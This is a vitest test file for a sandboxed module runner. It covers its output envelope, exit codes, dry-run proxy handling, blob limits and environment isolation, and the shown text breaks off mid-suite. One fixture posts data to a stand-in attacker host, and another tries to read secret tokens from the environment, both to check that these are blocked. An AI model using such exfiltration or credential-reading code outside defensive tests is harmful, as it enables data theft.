/* biome-ignore-all lint/suspicious/noTemplateCurlyInString: the fixtures are module source text, and a template placeholder inside a plain string is exactly what a module holds. */
import { spawn } from "node:child_process";
import {
  copyFile,
  lstat,
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { createServer, type IncomingHttpHeaders, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import {
  BLOB_QUOTA_BYTES,
  BLOB_REF_SCHEME,
  BLOB_TTL_MS,
  DRY_RUN_HEADER,
  DRY_RUN_INTERCEPTED,
  ENVELOPE_MARKER,
  MAX_BLOB_BYTES,
  MAX_BLOB_CONTENT_TYPE_CHARS,
  MAX_BLOB_NAME_CHARS,
  MODULE_ENTRIES,
  REFUSAL_HEADER,
  RESULT_MARKER,
  RUNNER_SOURCE_PATH,
} from "./runner-source";

/**
 * The runner, as a child process.
 *
 * Real Node against the real `runner.mjs`, with fixture modules in a temporary directory and a fake
 * proxy on a loopback port. The properties asserted are the contract's: what stdout carries, which
 * exit code each failure takes, what `ctx` carries, and that the environment a module could print is
 * not there to print. The proxy binding is exercised end to end against the real proxy in its own
 * package; here the fake records what arrived.
 */

const RUNNER = fileURLToPath(new URL("./runner.mjs", import.meta.url));

type Run = { code: number | null; stdout: string; stderr: string };

/**
 * The envelope stdout carries (the header of `runner.mjs`): the marker line, then one line of JSON
 * with the module's result beside the blob ledger. Parsed here by hand rather than through
 * `readRunnerEnvelope`, so the two halves of the contract are pinned independently.
 */
const parseEnvelope = (text: string) => {
  expect(text.startsWith(`${ENVELOPE_MARKER}\n`)).toBe(true);
  const json = text.slice(ENVELOPE_MARKER.length + 1);
  expect(json).not.toContain("\n");
  return JSON.parse(json) as { result: unknown; blobs: unknown[] };
};
const envelopeOf = (run: Run) => parseEnvelope(run.stdout);
const resultOf = (run: Run) => envelopeOf(run).result;
/** The same envelope, read back from a detached run's result file. */
const writtenEnvelope = async (path: string) => parseEnvelope(await readFile(path, "utf8"));

function runRunner(args: {
  module: string;
  stdin?: string;
  env?: Record<string, string>;
}): Promise<Run> {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [RUNNER, args.module], {
      // A clean environment, so a developer's own `HTTPS_PROXY` or `NODE_OPTIONS` cannot leak in.
      env: { PATH: process.env.PATH ?? "", ...args.env },
      stdio: ["pipe", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk: Buffer) => {
      stdout += chunk.toString();
    });
    child.stderr.on("data", (chunk: Buffer) => {
      stderr += chunk.toString();
    });
    child.on("error", reject);
    child.on("close", (code) => resolve({ code, stdout, stderr }));
    child.stdin.end(args.stdin ?? "");
  });
}

const FIXTURES: Record<string, string> = {
  "echo.mjs": "export default async (input) => ({ echoed: input });",
  "helper.mjs": "export const double = (n) => n * 2;",
  "sibling.mjs":
    'import { double } from "./helper.mjs";\nexport default async (input) => double(input.n);',
  "throws.mjs":
    'export default async () => { throw new Error("kaboom: the line items are missing"); };',
  // undici's shape for a connection that never opened: a bare TypeError over an errno in `cause`.
  "throwsWithCause.mjs": [
    "export default async () => {",
    '  const errno = Object.assign(new Error("getaddrinfo ENOTFOUND customer-api.example"), { code: "ENOTFOUND" });',
    '  throw new TypeError("fetch failed", { cause: errno });',
    "};",
  ].join("\n"),
  "redirected.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/redirected");',
    '  return { status: res.status, location: res.headers.get("location") };',
    "};",
  ].join("\n"),
  "hangs.mjs": "export default () => new Promise(() => {});",
  "notAFunction.mjs": "export default 42;",
  "leaks.mjs": [
    "export default async (_input, ctx) => ({",
    "  token: process.env.GRAFT_TOKEN ?? null,",
    '  graftEnv: Object.keys(process.env).filter((k) => k.startsWith("GRAFT_")).sort(),',
    "  ctxKeys: Object.keys(ctx).sort(),",
    "  proxyKey: ctx.proxyKey,",
    "});",
  ].join("\n"),
  // What a module sees of the exec's environment, at import time and again at call time.
  "envAtImport.mjs": [
    'const atImport = Object.keys(process.env).filter((k) => k.startsWith("GRAFT_")).sort();',
    "export default async () => ({",
    "  atImport,",
    '  atCall: Object.keys(process.env).filter((k) => k.startsWith("GRAFT_")).sort(),',
    "});",
  ].join("\n"),
  "fetches.mjs": [
    "export default async (input, ctx) => {",
    '  const res = await ctx.fetch("/v1/orders?x=1", {',
    '    method: "POST",',
    '    headers: { "content-type": "application/json" },',
    "    body: JSON.stringify(input),",
    "  });",
    "  return { status: res.status, body: await res.json(), connection: ctx.connection };",
    "};",
  ].join("\n"),
  "escapes.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    await ctx.fetch(input.path);",
    '    return "reached";',
    "  } catch (error) {",
    "    return { refused: error.message };",
    "  }",
    "};",
  ].join("\n"),
  // GRA-197: an absolute URL, as a vendor hands one back at run time, with whatever init the test gives.
  "absolute.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    const res = await ctx.fetch(input.url, input.init ?? {});",
    "    return {",
    "      status: res.status,",
    '      location: res.headers.get("location"),',
    "      body: res.status === 303 ? null : await res.json(),",
    "    };",
    "  } catch (error) {",
    "    return { refused: error.message };",
    "  }",
    "};",
  ].join("\n"),
  // Two writes to one path on two declared hosts (Greptile on #156): the report must tell them apart,
  // and each carries a query the report must not.
  "dryTwoHosts.mjs": [
    "export default async (_input, ctx) => {",
    '  const init = { method: "POST", headers: { "content-type": "text/plain" }, body: "same" };',
    '  const first = await ctx.fetch("https://files.example.com/upload?sig=first-secret", init);',
    '  const second = await ctx.fetch("https://other.example.com/upload?sig=second-secret", init);',
    "  return { first: first.status, second: second.status };",
    "};",
  ].join("\n"),
  // A capability in the fragment (Greptile on #156, third pass): alone on the read, beside a query on the write.
  "dryFragment.mjs": [
    "export default async (_input, ctx) => {",
    '  const read = await ctx.fetch("https://files.example.com/download#token=fragment-secret");',
    '  const write = await ctx.fetch("https://uploads.example.com/upload?sig=query-secret#token=fragment-secret", {',
    '    method: "POST",',
    '    body: "the bytes",',
    "  });",
    "  return { read: read.status, write: write.status };",
    "};",
  ].join("\n"),
  // A presigned pair (Greptile on #156): the signature rides in the query of a read and of a write.
  "dryPresigned.mjs": [
    "export default async (_input, ctx) => {",
    '  const read = await ctx.fetch("https://files.example.com/report.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Signature=deadbeefcafe0123");',
    '  const write = await ctx.fetch("https://uploads.example.com/put/object?X-Amz-Signature=feedface9876&X-Amz-Expires=300", {',
    '    method: "PUT",',
    '    body: "the bytes",',
    "  });",
    "  return { read: read.status, write: write.status };",
    "};",
  ].join("\n"),
  // The Slack shape (GRA-197): a read on a second host answers the URL the write goes to.
  "dryAbsolute.mjs": [
    "export default async (_input, ctx) => {",
    '  const read = await ctx.fetch("https://files.example.com/upload-url");',
    '  const write = await ctx.fetch("https://files.example.com/upload/v1/abc?x=1", {',
    '    method: "POST",',
    '    headers: { "content-type": "application/octet-stream" },',
    '    body: "the bytes",',
    "  });",
    "  return { read: read.status, write: write.status };",
    "};",
  ].join("\n"),
  // ADR 0010: the base an SDK is pointed at, for the primary host and for a declared one.
  "proxyBase.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    return {",
    "      primary: ctx.proxyBase(),",
    "      host: ctx.proxyBase(input.host),",
    "      frozen: Object.isFrozen(ctx),",
    "    };",
    "  } catch (error) {",
    "    return { refused: error.message };",
    "  }",
    "};",
  ].join("\n"),
  // An SDK stand-in: the base and key off ctx, then a request the SDK would make with them.
  "sdk.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await fetch(`${ctx.proxyBase("api.example.com")}/v2/things`, {',
    "    headers: { authorization: `Bearer ${ctx.proxyKey}` },",
    "  });",
    "  return { status: res.status, body: await res.json() };",
    "};",
  ].join("\n"),
  // The dry-run fixtures: a read, then a write handled off whatever came back.
  "dryReadOnly.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/items?limit=2");',
    "  return { status: res.status, items: await res.json() };",
    "};",
  ].join("\n"),
  "dryWrite.mjs": [
    "export default async (input, ctx) => {",
    '  const read = await ctx.fetch("/items");',
    '  const write = await ctx.fetch("/orders", {',
    '    method: "POST",',
    '    headers: { "content-type": "application/json", "x-idempotency": "k1" },',
    "    body: JSON.stringify(input),",
    "  });",
    "  return { read: read.status, write: write.status, answer: await write.json() };",
    "};",
  ].join("\n"),
  "dryWriteThrows.mjs": [
    "export default async (input, ctx) => {",
    '  await ctx.fetch("/items");',
    '  const write = await ctx.fetch("/orders", { method: "POST", body: JSON.stringify(input) });',
    "  const created = await write.json();",
    '  if (!created.id) throw new Error("the vendor returned no order id");',
    "  return created.id;",
    "};",
  ].join("\n"),
  "dryThrowsFirst.mjs": [
    "export default async () => {",
    '  throw new Error("cannot build the request: input.lines is undefined");',
    "};",
  ].join("\n"),
  "dryReadFails.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/missing");',
    "  return { status: res.status };",
    "};",
  ].join("\n"),
  // Two 502s: the proxy's own, marked, and the vendor's, not (GRA-79).
  "dryReadUnreachable.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/unreachable");',
    "  return { status: res.status, body: await res.json() };",
    "};",
  ].join("\n"),
  "dryReadVendorDown.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/vendor-down");',
    "  return { status: res.status };",
    "};",
  ].join("\n"),
  "dryWriteRefused.mjs": [
    "export default async (_input, ctx) => {",
    "  try {",
    '    await ctx.fetch("http://evil.example/collect?X-Amz-Signature=secret123", { method: "POST", body: "x" });',
    "  } catch (error) {",
    '    const res = await ctx.fetch("/orders", { method: "DELETE" });',
    "    return { caught: error.message, status: res.status };",
    "  }",
    "};",
  ].join("\n"),
  // The blob fixtures (GRA-186; ADR 0023): a write from each kind of data, the sidecar read back
  // through stat and the bytes through read, a stream that never ends, a ref that names nothing.
  "writesBlob.mjs": [
    "export default async (input, ctx) => {",
    '  const file = await ctx.blob.write(new TextEncoder().encode(input.text), { contentType: "text/plain", name: input.name });',
    "  return { file, stat: await ctx.blob.stat(file) };",
    "};",
  ].join("\n"),
  "writesBlobKinds.mjs": [
    "export default async (_input, ctx) => {",
    '  const bytes = await ctx.blob.write(Buffer.from("from bytes"), { contentType: "text/plain" });',
    '  const blob = await ctx.blob.write(new Blob(["from a blob"], { type: "text/plain" }), { contentType: "text/plain", name: "blob.txt" });',
    "  const stream = new ReadableStream({",
    "    start(controller) {",
    '      controller.enqueue(new TextEncoder().encode("from a "));',
    '      controller.enqueue(new TextEncoder().encode("stream"));',
    "      controller.close();",
    "    },",
    "  });",
    '  const streamed = await ctx.blob.write(stream, { contentType: "application/octet-stream" });',
    "  const read = await ctx.blob.read(streamed);",
    "  return { bytes, blob, streamed, read: { size: read.size, type: read.type, text: await read.text() } };",
    "};",
  ].join("\n"),
  // Chunks of 64 MiB, forever: the fifth crosses the cap before it is written.
  "writesHugeBlob.mjs": [
    "export default async (_input, ctx) => {",
    "  const chunk = new Uint8Array(64 * 1024 * 1024);",
    "  const stream = new ReadableStream({ pull(controller) { controller.enqueue(chunk); } });",
    "  try {",
    '    await ctx.blob.write(stream, { contentType: "application/octet-stream" });',
    '    return "written";',
    "  } catch (error) {",
    "    return { refused: error.message, code: error.code };",
    "  }",
    "};",
  ].join("\n"),
  "blobRefs.mjs": [
    "export default async (input, ctx) => {",
    "  const out = {};",
    "  for (const [key, ref] of Object.entries(input)) {",
    "    try { out[key] = await ctx.blob.stat(ref); } catch (error) { out[key] = { code: error.code ?? null, message: error.message }; }",
    "  }",
    "  return out;",
    "};",
  ].join("\n"),
  // A module whose result is shaped like the envelope, with a well-formed ledger line in it.
  "decoy.mjs":
    'export default async () => ({ result: 42, blobs: [{ ref: "blob://0f6b6c4e-6d4b-4a8b-9e6e-7c9d5b5f3a21", bytes: 1, contentType: "text/plain", expiresAt: "2099-01-01T00:00:00.000Z" }] });',
  "blobBadMeta.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    await ctx.blob.write(new Uint8Array(1), { contentType: input.contentType, name: input.name });",
    '    return "written";',
    "  } catch (error) {",
    "    return { refused: error.message, code: error.code ?? null };",
    "  }",
    "};",
  ].join("\n"),
  // Blobs of the sizes (in MiB) the input names, each streamed in 64 KiB chunks and each refusal
  // caught, so one run shows what the budget lets through and what it stops (GRA-187).
  "writesSizedBlobs.mjs": [
    "export default async (input, ctx) => {",
    "  const out = [];",
    "  for (const mib of input.sizes) {",
    "    const chunk = new Uint8Array(65536).fill(1);",
    "    let left = Math.round(mib * 16);",
    "    const stream = new ReadableStream({ pull(c) { if (left-- > 0) c.enqueue(chunk); else c.close(); } });",
    '    try { out.push({ ref: await ctx.blob.write(stream, { contentType: "application/octet-stream" }) }); }',
    "    catch (error) { out.push({ code: error.code ?? null, message: error.message }); }",
    "  }",
    "  return out;",
    "};",
  ].join("\n"),
  // Two 1 MiB writes started together: under a budget one of them fits, the shared reservation
  // decides which, and the other is refused (Greptile on #148).
  "writesConcurrentBlobs.mjs": [
    "export default async (_input, ctx) => {",
    "  const write = () => {",
    "    const chunk = new Uint8Array(65536).fill(3);",
    "    let left = 16;",
    "    const stream = new ReadableStream({ pull(c) { if (left-- > 0) c.enqueue(chunk); else c.close(); } });",
    '    return ctx.blob.write(stream, { contentType: "application/octet-stream" });',
    "  };",
    "  const settled = await Promise.allSettled([write(), write()]);",
    '  return settled.map((s) => s.status === "fulfilled" ? { ref: s.value } : { code: s.reason.code ?? null, message: s.reason.message });',
    "};",
  ].join("\n"),
  // A write, then a throw: the blob is committed and the failure must still report it.
  "writesThenThrows.mjs": [
    "export default async (input, ctx) => {",
    '  const file = await ctx.blob.write(new TextEncoder().encode("kept before the fall"), { contentType: "text/plain", name: "kept.txt" });',
    "  if (input.unserialisable) return { file, cycle: (() => { const o = {}; o.self = o; return o; })() };",
    "  throw new Error(`fell over after writing ${file}`);",
    "};",
  ].join("\n"),
  // The read half (GRA-187): every ref read, the found ones as their size and type.
  "readRefs.mjs": [
    "export default async (input, ctx) => {",
    "  const out = {};",
    "  for (const [key, ref] of Object.entries(input)) {",
    "    try { const blob = await ctx.blob.read(ref); out[key] = { size: blob.size, type: blob.type }; }",
    "    catch (error) { out[key] = { code: error.code ?? null, message: error.message }; }",
    "  }",
    "  return out;",
    "};",
  ].join("\n"),
  // Write bytes under a media type and read them straight back: what comes out is what went in.
  "readsBlob.mjs": [
    "export default async (input, ctx) => {",
    '  const file = await ctx.blob.write(Buffer.from(input.base64, "base64"), { contentType: input.contentType, name: input.name });',
    "  const blob = await ctx.blob.read(file);",
    '  return { file, size: blob.size, type: blob.type, base64: Buffer.from(await blob.arrayBuffer()).toString("base64") };',
    "};",
  ].join("\n"),
  // A 20 MiB blob written in 1 MiB chunks, then read back through `.stream()` chunk by chunk with a
  // collection between chunks (`--expose-gc` in NODE_OPTIONS): the high-water mark of the process's
  // ArrayBuffer memory says whether the read held the file whole.
  "streamsLargeBlob.mjs": [
    "export default async (_input, ctx) => {",
    "  const chunk = new Uint8Array(1024 * 1024).fill(7);",
    "  let left = 20;",
    "  const source = new ReadableStream({ pull(controller) { if (left-- > 0) controller.enqueue(chunk); else controller.close(); } });",
    '  const file = await ctx.blob.write(source, { contentType: "application/octet-stream" });',
    "  const blob = await ctx.blob.read(file);",
    "  globalThis.gc?.();",
    "  const baseline = process.memoryUsage().arrayBuffers;",
    "  let chunks = 0, total = 0, maxChunk = 0, peak = baseline;",
    "  for await (const part of blob.stream()) {",
    "    chunks += 1; total += part.byteLength; maxChunk = Math.max(maxChunk, part.byteLength);",
    "    if (chunks % 16 === 0) { globalThis.gc?.(); peak = Math.max(peak, process.memoryUsage().arrayBuffers); }",
    "  }",
    "  return { size: blob.size, type: blob.type, chunks, total, maxChunk, baseline, peak, gc: typeof globalThis.gc };",
    "};",
  ].join("\n"),
  "blobBadWrite.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    await ctx.blob.write(input.text, { contentType: input.contentType });",
    '    return "written";',
    "  } catch (error) {",
    "    return { refused: error.message };",
    "  }",
    "};",
  ].join("\n"),
  // The TypeScript contract. Erasable syntax only — annotations, an interface, a generic, a
  // `satisfies`, a type-only import — and a `.ts` sibling imported with its extension, as Node needs.
  "typed/index.ts": [
    'import type { Line } from "./lines.ts";',
    'import { total } from "./lines.ts";',
    "interface Input { customer: string; lines: Line[] }",
    "type Context = { fetch(path: string, init?: unknown): Promise<unknown> };",
    "const first = <T,>(items: readonly T[]): T | undefined => items[0];",
    "export default async (input: Input, _ctx: Context): Promise<{ customer: string; total: number; first: string | null }> => ({",
    "  customer: input.customer,",
    "  total: total(input.lines),",
    "  first: first(input.lines)?.sku ?? null,",
    "} satisfies { customer: string; total: number; first: string | null });",
  ].join("\n"),
  "typed/lines.ts": [
    "export type Line = { sku: string; qty: number };",
    "export const total = (lines: readonly Line[]): number => lines.reduce((sum, line) => sum + line.qty, 0);",
  ].join("\n"),
  // A directory holding only the second entry still runs.
  "legacy/index.mjs": "export default async (input) => ({ legacy: true, ...input });",
  // What the check refuses ahead of time, and why: Node cannot strip it.
  "enumerated/index.ts": "enum Status { Open }\nexport default async () => Status.Open;",
};

let fixtures: string;
let server: Server;
let proxyUrl: string;
const received: {
  method: string | undefined;
  url: string | undefined;
  headers: IncomingHttpHeaders;
  body: string;
}[] = [];

beforeAll(async () => {
  fixtures = await mkdtemp(join(tmpdir(), "runner-"));
  await Promise.all(
    Object.entries(FIXTURES).map(async ([name, source]) => {
      await mkdir(dirname(join(fixtures, name)), { recursive: true });
      await writeFile(join(fixtures, name), source, "utf8");
    }),
  );

  server = createServer((req, res) => {
    let body = "";
    req.on("data", (chunk: Buffer) => {
      body += chunk.toString();
    });
    req.on("end", () => {
      received.push({ method: req.method, url: req.url, headers: req.headers, body });
      res.setHeader("content-type", "application/json");
      const method = (req.method ?? "GET").toUpperCase();
      const token = req.headers.authorization ?? "";
      const vendorPath = (req.url ?? "/").replace(/^\/c\/[^/]+(\/h\/[^/]+)?/, "") || "/";
      const [path, query] = vendorPath.split("?");
      const isRead = method === "GET" || method === "HEAD";
      // The real proxy hands a vendor's 3xx back unfollowed, `Location` intact (redirects.ts).
      if (path === "/redirected") {
        if (token === `Bearer ${DRY_TOKEN}`) res.setHeader(DRY_RUN_HEADER, "forwarded");
        res.statusCode = 303;
        res.setHeader("location", "https://elsewhere.example/moved");
        res.end();
        return;
      }
      // The real proxy's dry-run answers: a read forwarded and marked; a write stopped with a
      // preview — the header *names* only, never values — on a distinct 2xx.
      if (token === `Bearer ${DRY_TOKEN}` || token === `Bearer ${DRY_REFUSING_TOKEN}`) {
        if (isRead) {
          res.setHeader(DRY_RUN_HEADER, "forwarded");
          if (path === "/missing") {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "not_found" }));
            return;
          }
          // The real proxy's refusal for a vendor it got no response from: marked, with the
          // cause's code and the host on the body (`failure.ts`, GRA-79)...
          if (path === "/unreachable") {
            res.statusCode = 502;
            res.setHeader(REFUSAL_HEADER, "upstream_unreachable");
            res.end(
              JSON.stringify({
                error: "bad_gateway",
                reason: "upstream_unreachable",
                message: "The vendor could not be reached",
                code: "ENOTFOUND",
                host: "api.vendor.example",
              }),
            );
            return;
          }
          // ...and a vendor's own 502, passed through with no mark.
          if (path === "/vendor-down") {
            res.statusCode = 502;
            res.end(JSON.stringify({ error: "maintenance" }));
            return;
          }
          res.end(JSON.stringify({ path: req.url, items: ["a", "b"] }));
          return;
        }
        if (token === `Bearer ${DRY_REFUSING_TOKEN}`) {
          res.statusCode = 403;
          res.end(JSON.stringify({ error: "forbidden", reason: "connection_mismatch" }));
          return;
        }
        res.statusCode = 202;
        res.setHeader(DRY_RUN_HEADER, DRY_RUN_INTERCEPTED);
        res.end(
          JSON.stringify({
            dryRun: true,
            intercepted: true,
            request: {
              method,
              path,
              hasQuery: query !== undefined,
              headerNames: Object.keys(req.headers)
                .filter((name) => name !== "authorization")
                .sort(),
              bodyBytes: Buffer.byteLength(body),
              body,
              bodyEncoding: "utf-8",
            },
          }),
        );
        return;
      }
      res.end(JSON.stringify({ path: req.url }));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  proxyUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

const fixture = (name: string) => join(fixtures, name);

const bound = () => ({
  GRAFT_PROXY_URL: proxyUrl,
  GRAFT_CONNECTION: "conn_1",
  GRAFT_TOKEN: "tok_secret_123",
});

/** The fake proxy reads the dry-run claim off the bearer token, as the real one does. */
const DRY_TOKEN = "tok_dry_run";
/** A dry-run token the fake proxy refuses every write on — another connection's, say. */
const DRY_REFUSING_TOKEN = "tok_dry_refused";

const dry = (token = DRY_TOKEN) => ({ ...bound(), GRAFT_TOKEN: token, GRAFT_DRY_RUN: "1" });

type DryRunReport = {
  dryRun: true;
  passed: boolean;
  reads: {
    method: string;
    path: string;
    status: number;
    reason?: string;
    code?: string | null;
    host?: string | null;
  }[];
  writesPreviewed: { method: string; path: string; headerNames: string[]; body: string | null }[];
  writesRefused: { method: string; path: string; status: number | null; error: string | null }[];
  moduleResult?: unknown;
  moduleError?: string;
  verified: { reads: boolean; writeRequests: boolean };
  unverified: string[];
};

describe("the stdout contract", () => {
  it("parses stdin, calls the default export and prints exactly the JSON result", async () => {
    const run = await runRunner({ module: fixture("echo.mjs"), stdin: '{"a": 1, "b": [true]}' });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    expect(resultOf(run)).toEqual({ echoed: { a: 1, b: [true] } });
    // Nothing but the envelope — the marker line, then the JSON. A module that wrote no blob carries
    // an empty ledger, so everything downstream of it reads what it always did (GRA-186).
    expect(run.stdout).toBe(
      `${ENVELOPE_MARKER}\n${JSON.stringify({ result: { echoed: { a: 1, b: [true] } }, blobs: [] })}`,
    );
  });

  /** Only the runner writes the marker, so a module's own `{ result, blobs }` is its result and nothing more. */
  it("returns a module's envelope-shaped result untouched, behind the marker, with an empty ledger", async () => {
    const run = await runRunner({ module: fixture("decoy.mjs") });

    expect(run.code).toBe(0);
    const envelope = envelopeOf(run);
    expect(envelope.result).toEqual({
      result: 42,
      blobs: [
        {
          ref: "blob://0f6b6c4e-6d4b-4a8b-9e6e-7c9d5b5f3a21",
          bytes: 1,
          contentType: "text/plain",
          expiresAt: "2099-01-01T00:00:00.000Z",
        },
      ],
    });
    expect(envelope.blobs).toEqual([]);
  });

  it("treats empty stdin as an empty input object", async () => {
    const run = await runRunner({ module: fixture("echo.mjs") });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({ echoed: {} });
  });

  /** The module contract allows sibling imports, so a tool can keep a helper beside its entry. */
  it("lets a module import a sibling", async () => {
    const run = await runRunner({ module: fixture("sibling.mjs"), stdin: '{"n": 21}' });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toBe(42);
  });
});

/**
 * The contract is TypeScript, run by Node 24's own type stripping, and the runner takes the module's
 * directory — resolving `index.ts` first, `index.mjs` second — so a record can point at a version
 * directory without knowing which entry it holds.
 */
describe("a TypeScript module", () => {
  it("runs a .ts entry with erasable syntax and a .ts sibling, given the directory", async () => {
    const run = await runRunner({
      module: fixture("typed"),
      stdin: JSON.stringify({
        customer: "ACME",
        lines: [
          { sku: "A", qty: 2 },
          { sku: "B", qty: 3 },
        ],
      }),
    });

    expect(run.stderr).toBe("");
    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({ customer: "ACME", total: 5, first: "A" });
  });

  it("runs the .ts entry given as a file, too", async () => {
    const run = await runRunner({
      module: fixture("typed/index.ts"),
      stdin: JSON.stringify({ customer: "ACME", lines: [] }),
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({ customer: "ACME", total: 0, first: null });
  });

  it("falls back to index.mjs when a directory holds no index.ts", async () => {
    const run = await runRunner({ module: fixture("legacy"), stdin: '{"n": 1}' });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({ legacy: true, n: 1 });
  });

  /** The reason the check refuses non-erasable syntax: here is what happens without it. */
  it("cannot load an enum, and says so on stderr with exit 1", async () => {
    const run = await runRunner({ module: fixture("enumerated") });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("ERR_UNSUPPORTED_TYPESCRIPT_SYNTAX");
  });

  it("exits 64 for a directory holding neither entry", async () => {
    const run = await runRunner({ module: fixtures });

    expect(run.code).toBe(64);
    expect(run.stderr).toContain("index.ts or index.mjs");
  });

  /** The runner ships to the sandbox alone, so it carries its own copy of the entry list. */
  it("resolves the same entries, in the same order, as runner-source.ts declares", async () => {
    const source = await readFile(RUNNER, "utf8");
    const declared = /const ENTRIES = (\[[^\]]*\]);/.exec(source)?.[1] ?? "[]";
    expect(JSON.parse(declared)).toEqual([...MODULE_ENTRIES]);
  });

  /** Likewise the dry-run header and the result marker: one artefact, two holders of each name. */
  it("names the dry-run header and the result marker runner-source.ts declares", async () => {
    const source = await readFile(RUNNER, "utf8");
    expect(source).toContain(`const DRY_RUN_HEADER = ${JSON.stringify(DRY_RUN_HEADER)};`);
    expect(source).toContain(`const DRY_RUN_INTERCEPTED = ${JSON.stringify(DRY_RUN_INTERCEPTED)};`);
    expect(source).toContain(`const REFUSAL_HEADER = ${JSON.stringify(REFUSAL_HEADER)};`);
    expect(source).toContain(`const RESULT_MARKER = ${JSON.stringify(RESULT_MARKER)};`);
  });

  /** And the blob contract's scheme, cap and life (GRA-186); the path names are pinned to `@graft/toolbox` in `packages/mcp/src/run.test.ts`. */
  it("names the blob scheme, cap and life runner-source.ts declares, and the quota is the server's alone", async () => {
    const source = await readFile(RUNNER, "utf8");
    expect(source).toContain(`const BLOB_REF_SCHEME = ${JSON.stringify(BLOB_REF_SCHEME)};`);
    // Spelt with their units in both files, so a reader sees 256 MiB and 24 hours, not a number.
    expect(source).toContain("const MAX_BLOB_BYTES = 256 * 1024 * 1024;");
    expect(MAX_BLOB_BYTES).toBe(256 * 1024 * 1024);
    expect(source).toContain("const BLOB_TTL_MS = 24 * 60 * 60 * 1000;");
    expect(BLOB_TTL_MS).toBe(24 * 60 * 60 * 1000);
    expect(source).toContain(`const ENVELOPE_MARKER = ${JSON.stringify(ENVELOPE_MARKER)};`);
    expect(source).toContain(`const MAX_BLOB_NAME_CHARS = ${MAX_BLOB_NAME_CHARS};`);
    expect(source).toContain(`const MAX_BLOB_CONTENT_TYPE_CHARS = ${MAX_BLOB_CONTENT_TYPE_CHARS};`);
    // The quota is judged at the door over the rows (GRA-187); the runner holds no copy of the
    // number to drift, and learns its run's budget and the quota from the door's two variables.
    expect(BLOB_QUOTA_BYTES).toBe(1024 * 1024 * 1024);
    expect(source).not.toMatch(/const \w*QUOTA\w* = \d/);
    expect(source).toContain("process.env.GRAFT_BLOB_BUDGET_BYTES");
    expect(source).toContain("process.env.GRAFT_BLOB_QUOTA_BYTES");
  });
});

describe("failures, each with its own exit code", () => {
  it("exits 1 with the error on stderr when the module throws, and prints no result", async () => {
    const run = await runRunner({ module: fixture("throws.mjs") });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("kaboom: the line items are missing");
  });

  it("prints each cause after the stack, so a fetch that never connected names its host", async () => {
    const run = await runRunner({ module: fixture("throwsWithCause.mjs") });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("TypeError: fetch failed");
    expect(run.stderr).toContain(
      "caused by: Error [ENOTFOUND]: getaddrinfo ENOTFOUND customer-api.example",
    );
    // The chain follows the stack, so the tail `fail` keeps ends in the cause.
    expect(run.stderr.indexOf("caused by:")).toBeGreaterThan(run.stderr.indexOf("fetch failed"));
  });

  it("exits 1 when the default export is not a function", async () => {
    const run = await runRunner({ module: fixture("notAFunction.mjs") });

    expect(run.code).toBe(1);
    expect(run.stderr).toContain("must export a default function");
  });

  /** Distinct from a throw, so a caller can tell slow from wrong. */
  it("exits 2 with a distinct message when the module does not settle within GRAFT_TIMEOUT_MS", async () => {
    const run = await runRunner({
      module: fixture("hangs.mjs"),
      env: { GRAFT_TIMEOUT_MS: "200" },
    });

    expect(run.code).toBe(2);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("Timed out after 200ms");
  });

  it("exits 64 when invoked without a module path", async () => {
    const run = await runRunner({ module: "" });

    expect(run.code).toBe(64);
    expect(run.stderr).toContain("usage:");
  });

  it("exits 64 when stdin is not JSON", async () => {
    const run = await runRunner({ module: fixture("echo.mjs"), stdin: "not json" });

    expect(run.code).toBe(64);
    expect(run.stderr).toContain("stdin is not JSON");
  });
});

describe("the exec's environment stays out of the module's reach", () => {
  /**
   * The module gets a `ctx` and nothing that *is* the environment. The environment is what a module
   * would print, so that is what is asserted — every `GRAFT_*` variable, not the token alone. The
   * token itself is on `ctx.proxyKey` by decision (ADR 0010, amended): an SDK needs a credential
   * slot filled, and the proxy swaps this one for the real credential.
   */
  it("is deleted from process.env before the module loads, and ctx carries exactly five names", async () => {
    const run = await runRunner({
      module: fixture("leaks.mjs"),
      env: { ...bound(), GRAFT_AGENT: "agent_1", GRAFT_TOOL_VERSION: "ver_1" },
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      token: null,
      graftEnv: [],
      ctxKeys: ["blob", "connection", "fetch", "proxyBase", "proxyKey"],
      proxyKey: "tok_secret_123",
    });
  });

  /** Every variable the runner reads, set at once; none of them visible at import time or at call time. */
